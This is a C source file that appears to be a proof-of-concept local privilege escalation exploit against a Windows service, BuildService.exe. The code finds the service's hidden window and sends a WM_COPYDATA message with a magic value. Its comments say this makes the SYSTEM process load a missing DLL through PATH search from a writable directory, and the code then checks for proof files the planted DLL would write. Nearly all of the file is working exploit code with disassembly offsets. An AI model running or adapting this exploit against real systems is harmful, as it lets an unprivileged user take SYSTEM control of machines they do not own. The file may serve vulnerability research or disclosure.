/*
 * copydata_trigger.c
 *
 * Sends WM_COPYDATA (0x4A) to BuildService.exe's hidden VCL window.
 * BuildService.exe WndProc at 0x18b0ba calls SafeLoadLibrary("vcltest3.dll").
 * Since vcltest3.dll doesn't exist in the app dir or System32, Windows falls
 * through to PATH search — finds our payload in vmware\bin (SYSTEM PATH #2).
 *
 * Flow confirmed via IDA:
 *   18b082: recv WM_COPYDATA (0x4A)
 *   18b088: check COPYDATASTRUCT.dwData == 0xDE534454
 *   18b097: check [TApplication+0x8E] != 0 (set to 1 in constructor, always true)
 *   18b0ba: SafeLoadLibrary("vcltest3.dll", SEM_NOOPENFILEERRORBOX)
 *   18b0d6: GetProcAddress(hMod, "RegisterAutomation") + call it
 *
 * Build:
 *   cl /nologo copydata_trigger.c /Fe:copydata_trigger.exe
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

typedef struct { DWORD pid; HWND hwnd; } FindParam;

static BOOL CALLBACK EnumWndCB(HWND hw, LPARAM lp) {
    FindParam *p = (FindParam*)lp;
    DWORD pid = 0;
    GetWindowThreadProcessId(hw, &pid);
    if (pid == p->pid) { p->hwnd = hw; return FALSE; }
    return TRUE;
}

static DWORD PidByName(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static HWND FindWindowByPid(DWORD pid) {
    FindParam p = { pid, NULL };
    EnumWindows(EnumWndCB, (LPARAM)&p);
    return p.hwnd;
}

static void CheckProof(void) {
    const char *paths[] = {
        "C:\\ProgramData\\dll_lpe_proof.txt",
        "C:\\Windows\\dll_lpe_created.txt",
        "C:\\Windows\\Temp\\dll_lpe_proof.txt"
    };
    for (int i = 0; i < 3; i++) {
        if (GetFileAttributesA(paths[i]) != INVALID_FILE_ATTRIBUTES) {
            printf("  [!] FOUND: %s\n", paths[i]);
            FILE *f = fopen(paths[i], "r");
            if (f) {
                char buf[4096]; int n = fread(buf, 1, sizeof(buf)-1, f);
                if (n > 0) { buf[n] = 0; printf("%s\n", buf); }
                fclose(f);
            }
        }
    }
}

int main(void) {
    printf("[*] BuildService WM_COPYDATA LPE trigger\n\n");

    /* 1. Find BuildService.exe PID */
    DWORD pid = PidByName("BuildService.exe");
    if (!pid) { fprintf(stderr, "[-] BuildService.exe not running\n"); return 1; }
    printf("[+] BuildService.exe PID: %u\n", pid);

    /* 2. Find its VCL application window (hidden) */
    HWND hwnd = FindWindowByPid(pid);
    if (!hwnd) {
        /* Fallback: try message-only window parent (HWND_MESSAGE children) */
        printf("[*] No top-level window found, trying EnumChildWindows on desktop...\n");
        HWND child = GetWindow(GetDesktopWindow(), GW_CHILD);
        while (child) {
            DWORD cpid = 0;
            GetWindowThreadProcessId(child, &cpid);
            if (cpid == pid) { hwnd = child; break; }
            child = GetWindow(child, GW_HWNDNEXT);
        }
    }
    if (!hwnd) { fprintf(stderr, "[-] Could not find window for BuildService.exe\n"); return 1; }

    char cls[128] = {0}, title[128] = {0};
    GetClassNameA(hwnd, cls, sizeof(cls));
    GetWindowTextA(hwnd, title, sizeof(title));
    printf("[+] Window: HWND=%p  class='%s'  title='%s'\n", (void*)hwnd, cls, title);

    /* 3. Prepare COPYDATASTRUCT */
    COPYDATASTRUCT cds;
    cds.dwData = 0xDE534454;   /* magic checked at 0x18b088 */
    cds.cbData = 0;
    cds.lpData = NULL;

    printf("[*] Sending WM_COPYDATA (0x4A) with dwData=0xDE534454...\n");

    /* WM_COPYDATA is UIPI-exempt: Medium IL can send to SYSTEM */
    LRESULT res = SendMessage(hwnd, WM_COPYDATA,
                              (WPARAM)GetDesktopWindow(),
                              (LPARAM)&cds);
    printf("[*] SendMessage returned: 0x%IX\n", (UINT_PTR)res);

    /* 4. Check for proof files */
    printf("\n[*] Checking proof files...\n");
    Sleep(500);
    CheckProof();

    return 0;
}
